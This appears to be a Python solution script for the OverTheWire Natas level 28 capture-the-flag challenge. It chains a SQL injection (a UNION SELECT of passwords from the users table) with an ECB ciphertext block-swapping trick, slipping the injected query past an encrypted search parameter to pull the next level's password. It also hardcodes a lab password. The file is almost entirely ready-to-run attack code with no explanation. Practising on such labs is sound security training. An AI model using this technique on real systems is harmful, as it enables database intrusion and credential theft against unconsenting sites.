import requests
import re
import urllib.parse
import base64
import binascii

def hex_to_base64(hex_string):
    bytes_data = binascii.unhexlify(hex_string) 
    base64_string = base64.b64encode(bytes_data).decode('utf-8')
    
    return base64_string

def base64_to_hex(base64_string):
    decoded_bytes = base64.b64decode(base64_string) 
    hex_string = binascii.hexlify(decoded_bytes).decode('utf-8')
    
    return hex_string

def get_data(url,username,password,data):
    req = requests.post(url + "index.php",data=data,auth=(username,password))
    search = re.findall("query=(.*)",req.url)
    query = urllib.parse.unquote(search[0])
    
    return query

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    sqli_data = {
            "query":"A"*9 + "' UNION ALL SELECT password from users;#"
            }
    query = get_data(url,username,password,sqli_data)
    hex_string1 = base64_to_hex(query)
    
    fake_block_data = {
            "query":"A"*12
            }
    query = get_data(url,username,password,fake_block_data)
    hex_string2 = base64_to_hex(query)
    
    final_hex = hex_string1.replace(hex_string1[64:96],hex_string2[64:96])
    base64_payload = hex_to_base64(final_hex)
    final_payload = urllib.parse.quote(base64_payload)
    req = requests.get(url + "search.php/?query=" + final_payload,auth=(username,password))
    
    text = re.findall("Joke Database</h2><ul><li>(.*)</li></ul>",req.text)
    print("The flag for natas28 is: " + text[0])

if __name__=="__main__":
    url = "http://natas28.natas.labs.overthewire.org/"
    username = "natas28"
    password = "skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4"
    flag(url,username,password)